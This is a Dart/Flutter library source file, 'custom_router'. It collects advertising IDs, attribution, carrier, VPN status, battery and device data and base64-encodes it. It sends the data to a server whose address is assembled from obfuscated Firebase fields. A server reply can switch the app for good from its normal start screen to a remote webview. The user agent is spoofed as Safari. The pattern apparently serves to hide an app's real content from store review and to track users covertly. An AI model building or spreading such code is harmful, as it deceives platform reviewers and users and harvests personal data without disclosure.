library custom_router;

import 'dart:async';
import 'dart:convert';
import 'dart:ffi';
import 'dart:io';

import 'package:advertising_id/advertising_id.dart';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:carrier_info/carrier_info.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:devicelocale/devicelocale.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_analytics/firebase_analytics.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
// import 'package:flutter_facebook_sdk/flutter_facebook_sdk.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:custom_router/local_settings.dart';
import 'package:custom_router/pair.dart';
import 'package:custom_router/enums.dart';
// import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';
import 'package:http/http.dart' as http;
import 'package:check_vpn_connection/check_vpn_connection.dart';
import 'package:fk_user_agent/fk_user_agent.dart';

export 'screens/splash_screen.dart';

extension on Enum {
  String asString() {
    return toString().split('.').last;
  }
}

extension on Map<ResponseField, String> {
  String get url1 => this[ResponseField.url1]!;
  String get url2 => this[ResponseField.url2]!;
}

extension ResponseUtil on http.Response {
  String? getUriFromBody(Map<ResponseField, String> responseField) {
    try {
      final decodedBody = jsonDecode(body);

      String url = (decodedBody[responseField.url1] ?? '') +
          (decodedBody[responseField.url2] ?? '');

      if (url.isEmpty) {
        print("AAA url from decoded body is empty");
        return null;
      }

      return "https://$url";
    } catch (e) {
      print("AAA exception while decoding body $e");
      return null;
    }
  }

  // lake
  bool isFinalUriCachingForced() {
    try {
      final decodedBody = jsonDecode(body);
      return decodedBody["lake"].toString() == "true";
    } catch (e) {
      return false;
    }
  }

  // tree
  bool isOpeningInBrowserForced() {
    try {
      final decodedBody = jsonDecode(body);
      return decodedBody["tree"].toString() == "true";
    } catch (e) {
      return false;
    }
  }
}

extension MapRequest on Map<String, String> {
  String mapRequestToBase64() {
    var query = [];
    forEach((k, v) => query.add("$k=$v"));
    var joinedQuery = query.join("&");
    print("AAA query: $joinedQuery");
    return base64Encode(utf8.encode(joinedQuery));
  }
}

extension FirebaseProvidedData on Map<FirebaseField, Pair> {
  String requestUri() {
    return "https://${this[FirebaseField.url1]?.value}${this[FirebaseField.url2]?.value}";
  }
}

// usage example
// void main() {
//   CustomRouter(
//     {
//       FirebaseField.url1: Pair("bused", ""),
//       FirebaseField.url2: Pair("robes", "")
//     },
//     {
//       ResponseField.url1: "kicks",
//       ResponseField.url2: "boned",
//     }, {
//       SdkKey.appsflyer: "",
//       SdkKey.appsflyer_app_id: "1354345345",
//       SdkKey.onesignal: "sgdfgdsfg",
//     });
// }

class CustomRouter {
  final Map<FirebaseField, Pair> firebaseFields;
  final Map<ResponseField, String> responseField;
  final Map<SdkKey, String> sdkKeys;

  late Map<FirebaseField, Pair> firebaseProvidedData;
  late LocalSettings localSettings;


  String appsUID = "";

  var isConversionHandled = false;

  CustomRouter(this.firebaseFields, this.responseField, this.sdkKeys);

//**
// start
//
// */

  Future<Map<String, String>?> fetchAppsFlyerData(
      String key, String appId) async {
    var duration = const Duration(seconds: 30);

    Completer<void> onConversionDataCompleter = Completer<void>();

    var result = <String, String>{};

    var af = AppsflyerSdk(AppsFlyerOptions(
      afDevKey: key,
      appId: appId,
      showDebug: true,
      timeToWaitForATTUserAuthorization: 10,
      // disableAdvertisingIdentifier: true,
      // disableCollectASA: true
    ));

    // Map<String, dynamic>
    af.onInstallConversionData((res) {
      if (isConversionHandled) {
        print("AAA onInstallConversionData already handled");
      } else {
        print(
            "AAA onInstallConversionData called $res, data: ${res["payload"]}");
        var data = res?['payload'];
        print("AAA enumerating conversion data");
        data.forEach((key, value) {
          if (value == null) {
            print("AAA enum searching cancelled for $key, value is null");
          } else {
            print(
                "AAA enum searching for $key in collectable fields with value of ${value.toString()}");
            for (var collectableKey in CollectableFields.values) {
              if (key.toString() == collectableKey.asString() &&
                  value.toString().isNotEmpty) {
                result[collectableKey.asString()] = value;
                break;
              }
            }
          }
        });
        print("AAA enumerating completed: $result");
        isConversionHandled = true;
        onConversionDataCompleter.complete();
      }
    });

    af.onDeepLinking((res) {
      print("AAA onDeepLinking called ${res.deepLink?.campaignId ?? "null"}");

      var campaign = res.deepLink?.campaign ?? "";
      var deepLinkValue = res.deepLink?.deepLinkValue ?? "";
      var campaignId = res.deepLink?.campaignId ?? "";

      if (campaign.isNotEmpty) {
        result["campaign"] = campaign;
      }

      if (deepLinkValue.isNotEmpty) {
        result["deepLinkValue"] = deepLinkValue;
      }

      if (campaignId.isNotEmpty) {
        result["campaignId"] = campaignId;
      }
    });

    af.onAppOpenAttribution((res) {
      print("AAA onAppOpenAttribution called $res");
    });

    var status = await af.initSdk(
        registerConversionDataCallback: true,
        registerOnDeepLinkingCallback: true,
        registerOnAppOpenAttributionCallback: true);

    af.enableFacebookDeferredApplinks(true);

    print("AAA sdk was init $status");

    // appsUID needed for onesignal
    appsUID = await af.getAppsFlyerUID() ?? "";
    result[CollectableFields.appsflyer_id.asString()] = appsUID;

    print("AAA waiting for onConversionDataCompleter...");

    await onConversionDataCompleter.future.timeout(duration, onTimeout: () => print("onConversionDataCompleter timeout"));

    // var conversionData = await onConversionDataCompleter.future
    //     .timeout(duration, onTimeout: () => null);

    // await Future.delayed(const Duration(seconds: 5), () {
    //  print("AAA waiting...");
    // });

    print("AAA waiting for onConversionDataCompleter completed with $result");

    return result;
  }

  Future<Map<String, String>?> fetchAdvertisingData() async {
    String? aid;
    try {
      aid = await AdvertisingId.id(true);
    } catch (e) {
      print("AAA unable to fetch aid: $e");
    }
    return {CollectableFields.advertising_id.asString(): aid ?? ""};
  }

  Future<Map<String, String>?> fetchFirebaseAnalyticsAppInstance(String userId) async {
    FirebaseAnalytics analytics = FirebaseAnalytics.instance;
    await analytics.setUserId(id: userId);
    String? appId = await analytics.appInstanceId;
    return {CollectableFields.appInstanceId.asString(): appId ?? ""};
  }


  Future<Map<String, String>> fetchDeviceData() async {
    final package = (await PackageInfo.fromPlatform()).packageName;
    final locale = await Devicelocale.currentLocale.catchError((err) => '');
    final batteryLevel = await Battery().batteryLevel.catchError((err) => 0);
    final batteryCharging = (await Battery()
            .onBatteryStateChanged
            .first
            .catchError((err) => BatteryState.unknown)) ==
        BatteryState.charging;

    String deviceInfo = "";
    bool isTablet = false;

    if (Platform.isIOS) {
      final iosInfo = await DeviceInfoPlugin().iosInfo;
      deviceInfo = iosInfo.utsname.machine ?? "";
      isTablet = iosInfo.model?.toLowerCase().contains('ipad') ?? false;
    } else if (Platform.isAndroid) {
      final androidInfo = await DeviceInfoPlugin().androidInfo;
      deviceInfo = "${androidInfo.brand} ${androidInfo.model}";
    }

    final mno = await CarrierInfo.carrierName.catchError((err) => '');
    final isVpnActive = await CheckVpnConnection.isVpnActive();

    // final prefs = await SharedPreferences.getInstance();
    // await prefs.setString('locale', locale ?? "");

    return {
      CollectableFields.battery_level.asString(): batteryLevel.toString(),
      CollectableFields.phone_brand.asString(): deviceInfo,
      CollectableFields.locale.asString(): locale.toString(),
      CollectableFields.vpn.asString(): isVpnActive.toString(),
      CollectableFields.android_id.asString(): const Uuid().v1(),
      CollectableFields.charging.asString(): batteryCharging.toString(),
      CollectableFields.InstallReferrer.asString(): "",
      CollectableFields.is_tablet.asString(): isTablet.toString(),
      CollectableFields.bundleId.asString(): package
    };
  }

  Future<Map<String, String>?> collectDataForHttpRequest() async {
    final httpRequestData = <String, String>{};

    try {
      print("AAA initializing firebase with options");
      await Firebase.initializeApp();
      print("AAA initializing firebase success");
    } on Exception catch (e) {
      print("AAA exception on initializeApp (1) ${e}");
    }

    localSettings = await LocalSettings.create();
    if (localSettings.isInitiated()) {
      return null;
    }

    print("AAA firebase loading remote data");
    firebaseProvidedData =
        await FirebaseDatabase.instance.mapProvidedData(firebaseFields);
    if (!firebaseProvidedData.isAllRequiredFieldsExists()) {
      print("AAA some of the expected fields are empty");
      return null;
    }

    // // get fb deeplinks
    // final fbData = await fetchFacebookAppLinks();
    // if(fbData != null) {
    //   httpRequestData.addAll(other)
    // }

    // launch appsflyer
    if (sdkKeys.containsKey(SdkKey.appsflyer) &&
        sdkKeys.containsKey(SdkKey.appsflyer_app_id)) {
      if ((sdkKeys[SdkKey.appsflyer] ?? '').isNotEmpty &&
          (sdkKeys[SdkKey.appsflyer_app_id] ?? '').isNotEmpty) {
        print("AAA appsflyer launching...");
        var appsFlyerResponse = await fetchAppsFlyerData(
            sdkKeys[SdkKey.appsflyer] ?? '',
            sdkKeys[SdkKey.appsflyer_app_id] ?? '');
        if (appsFlyerResponse != null) {
          print("AAA appsFlyerResponse: $appsFlyerResponse");
          httpRequestData.addAll(appsFlyerResponse);
        }
      } else {
        print("AAA appsflyer keys are exists but empty?");
      }
    } else {
      print("AAA appsflyer keys are not defined");
    }

    // launch onesignal
    if (sdkKeys.containsKey(SdkKey.onesignal) &&
        (sdkKeys[SdkKey.onesignal] ?? '').isNotEmpty) {
      print("AAA launch onesignal ${sdkKeys[SdkKey.onesignal]}");
      print("AAA setExternalUserId as $appsUID");
      OneSignal.shared.setExternalUserId(appsUID);
      OneSignal.shared.setAppId(sdkKeys[SdkKey.onesignal] ?? '');
      await OneSignal.shared.promptUserForPushNotificationPermission();
    }

    var aid = await fetchAdvertisingData();
    if (aid != null) {
      httpRequestData.addAll(aid);
    }

    var appInstanceId = await fetchFirebaseAnalyticsAppInstance(appsUID);
    if(appInstanceId != null) {
      httpRequestData.addAll(appInstanceId);
    }

    var deviceInfo = await fetchDeviceData();
    httpRequestData.addAll(deviceInfo);

    return httpRequestData;
  }

  Future<String> getUserAgent() async {
    String ua = "";
    String defaultUa =
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";
    await FkUserAgent.init();

    try {
      ua = FkUserAgent.webViewUserAgent!;

      // test

      var isEmulator = FkUserAgent.getProperty("isEmulator");
      var systemName = FkUserAgent.getProperty("systemName");
      var systemVersion = FkUserAgent.getProperty("systemVersion");
      var applicationName = FkUserAgent.getProperty("applicationName");
      var applicationVersion = FkUserAgent.getProperty("applicationVersion");
      var buildNumber = FkUserAgent.getProperty("buildNumber");
      var darwinVersion = FkUserAgent.getProperty("darwinVersion");
      var cfnetworkVersion = FkUserAgent.getProperty("cfnetworkVersion");
      var deviceName = FkUserAgent.getProperty("deviceName");
      var packageUserAgent = FkUserAgent.getProperty("packageUserAgent");
      var userAgent = FkUserAgent.getProperty("userAgent");
      var webViewUserAgent = FkUserAgent.getProperty("webViewUserAgent");

      // print("AAA isEmulator $isEmulator");
      // print("AAA systemName $systemName");
      // print("AAA systemVersion $systemVersion");
      // print("AAA applicationName $applicationName");
      // print("AAA buildNumber $buildNumber");
      // print("AAA darwinVersion $darwinVersion");
      // print("AAA cfnetworkVersion $cfnetworkVersion");
      // print("AAA deviceName $deviceName");
      // print("AAA packageUserAgent $packageUserAgent");
      // print("AAA userAgent $userAgent");
      // print("AAA webViewUserAgent $webViewUserAgent");

      int index = ua.indexOf('Mobile');
      var version = "Version/13.0.3";
      var safari = "Safari/604.1";

      if (index == -1) {
        print("AAA no mobile string found");
        ua = defaultUa;
      } else {
        ua = ua.substring(0, index) +
            "$version " +
            ua.substring(index) +
            " $safari";
      }
      print("AAA useragent fetched: $ua");
    } on PlatformException {
      print("AAA useragent fetching error, set default");
      ua = defaultUa;
    }
    return ua;
  }

  Future<void> makeHttpRequest(Map<String, String> requestData) async {
    print("AAA >>>>>>> ${firebaseProvidedData.requestUri()}");

    final request = Uri.tryParse(firebaseProvidedData.requestUri())
        ?.replace(queryParameters: {"data": requestData.mapRequestToBase64()});

    if (request == null) {
      print("AAA request is empty?");
      return;
    }
    print("AAA request $request, making request");
    final response = await http.get(request);
    print("AAA ${response.body}");
    var webViewUrl = response.getUriFromBody(responseField);

    if (webViewUrl == null) {
      return;
    }

    localSettings = await LocalSettings.create();
    localSettings.setInitiated();
    localSettings.setWebViewUrl(webViewUrl);

    if (response.isFinalUriCachingForced()) {
      print("AAA final link caching enabled");
      localSettings.setFinalLinkCachingEnabled();
    } else {
      print("AAA final link caching not enabled");
    }

    if (response.isOpeningInBrowserForced()) {
      print("AAA opening in browser forced");
      localSettings.setOpenInBrowserEnabled();
    } else {
      print("AAA opening in browser not forced");
    }
    print("AAA final url extracted: $webViewUrl");
  }

  Future<void> routeWithNavigator(
      NavigatorState navigator,
      WidgetBuilder startScreen,
      Widget Function(String url, String userAgent) webViewBuilder) async {
    print("AAA routeWithNavigator launched");

    localSettings = await LocalSettings.create();
    var url = localSettings.getWebViewUrl();
    var userAgent = await getUserAgent();
    if (url.isEmpty) {
      print("AAA routeWithNavigator is empty");
      navigator.pushAndRemoveUntil(
        MaterialPageRoute(builder: startScreen),
        (route) => false,
      );
    } else {
      navigator.pushAndRemoveUntil(
          MaterialPageRoute(builder: (_) => webViewBuilder(url, userAgent)),
          (router) => false);
    }
  }

  Future<void> initializeTransparancyFramework() async {
    if (Platform.isIOS) {
      try {
        final TrackingStatus status =
            await AppTrackingTransparency.trackingAuthorizationStatus;

        if (status == TrackingStatus.notDetermined) {
          print("AAA status not determined");
          await Future.delayed(const Duration(milliseconds: 1000));
          final TrackingStatus status =
              await AppTrackingTransparency.requestTrackingAuthorization();
        }
      } on PlatformException {
        print("AAA platform exception thrown");
      }
    }
  }
}
